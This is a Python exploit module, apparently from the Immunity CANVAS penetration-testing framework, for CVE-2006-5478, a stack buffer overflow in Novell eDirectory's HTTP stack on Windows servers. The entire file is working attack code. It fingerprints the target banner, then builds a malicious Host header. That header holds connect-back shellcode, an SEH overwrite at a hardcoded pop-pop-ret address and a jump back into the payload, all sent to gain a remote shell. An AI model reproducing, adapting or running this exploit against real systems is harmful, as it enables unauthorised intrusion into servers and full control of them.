#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2006
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
if "." not in sys.path: sys.path.append(".")

import os
import getopt
import socket
import time
#import base64
#import random

# CANVAS modules
from exploitutils import *
from tcpexploit import *
import canvasengine

# GUI info
NAME="Novell eDirectory HttpStk.dlm Overflow"
DESCRIPTION="Stack overflow vulnerability in Novell eDirectory HTTP stack"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Novell"
DOCUMENTATION["Date public"] = "10/20/2006"
DOCUMENTATION["CVE Name"] = "CVE-2006-5478"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5478"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["CERT Advisory"] = ""
DOCUMENTATION["References"] = "http://www.mnin.org/advisories/2006_novell_httpstk.pdf"
DOCUMENTATION["Notes"]=""
DOCUMENTATION["Repeatability"] = ""

VERSION="0.1"
GTK2_DIALOG="dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000", "2003" ]

CHANGELOG="""
"""

NOTES="""
Tested on:
Windows 2000 Server SP3 OOTB with Novell eDirectory 8.8
Windows 2003 Server Standard SP0 OOTB with Novell eDirectory 8.8.1
"""

runAnExploit_gtk2 = canvasengine.runAnExploit_gtk2
runExploit = canvasengine.runExploit

targets = {
    0 : ["Autoversioning (N/A)", 0],
    1 : ["Novell eDirectory 8.8 and 8.8.1", 0x6ae0106a], #pop,pop,ret @schematl.dll
          }

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name = NAME
        self.setInfo(DESCRIPTION)
        self.covertness = 0
        self.ssl = 0
        self.port = 8028 #8030 for SSL
        self.host = "10.11.11.60"
        self.localhost = "10.11.11.1"
        self.localport = 5555
        self.badstring = "\x00\r\n:"
        return
   
    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        return self.createSmallWin32Shellcode(self.callback.ip, self.callback.port, subesp = 1000)

    def test(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port", self.port))

        request = "GET /dhost HTTP/1.1\r\n"
        request += "Host: %s:%d\r\n\r\n" % (self.host, self.port)
        s = self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            self.log("Failed to connect.")
            return 0
        self.websend(s, request)
        result = self.webrecv(s)
        self.log("Result: %s" % result)
            
        if result.find("DHost/9.0 HttpStk/1.0") != -1:
            return 1
        else:
            return 0
        
    def buildRequest(self, eip):
        request = "GET /dhost HTTP/1.1\r\n"
        request += "Host: "
        host = self.shellcode
        host += 'A'*(404-len(self.shellcode))
        if self.ssl == 1:
            host += 'B'*40 #slight difference when using SSL
        host += "\xeb\x06BB" #jmp $+6
        import struct
        host += struct.pack('<L',eip) #SEH
        from MOSDEF import mosdef
        host += mosdef.assemble("jmp $-%d"%(len(host)+5),"X86") #jmp back
        host += 'C'*128 #this will get us out of the stack
        request += host + "\r\n\r\n"
        return request
    
    def sendRequest(self, request):
        s = self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            self.log("Failed to connect.")
            return 0
        self.websend(s, request)
        try:
            result = self.webrecv(s)
        except timeoutsocket.Timeout:
            return 1
        return 0
    
    def run(self):
        self.host = self.target.interface
        self.ssl = int(self.argsDict.get("ssl", self.ssl))
        defaultPort = 8028
        if self.ssl == 1:
            self.log("Using SSL")
            defaultPort = 8030
        self.port = int(self.argsDict.get("port", defaultPort))
        self.setInfo("%s attacking %s:%d - (in progress)" % (NAME, self.host, self.port))
        self.log("%s attacking %s:%d - (in progress)" % (NAME, self.host, self.port))
        
        if self.version == 0:
            self.log("Autoversioning not available")
            return 0
        
        self.info, self.eip = targets[self.version]
        request = self.buildRequest(self.eip)
        self.setProgress(50)
        ret = self.sendRequest(request)
        self.setProgress(75)

        time.sleep(1)

        if self.ISucceeded():
            self.setProgress(100)
            self.setInfo("%s attacking %s:%d (succeeded!)" % (NAME, self.host, self.port))
            return 1

        self.setInfo("%s attacking %s:%d (failed)" % (NAME, self.host, self.port))
        return ret

    def displayVersions(self):
        i = 0
        print "Available versions:"
        for listline in targets.values():
            print "\t%d : %s"% (i, listline[0])
            i = i + 1
        return

if __name__== '__main__':
    print "Running CANVAS "+NAME+" version "+VERSION
    app = theexploit()
    ret = standard_callback_commandline(app)
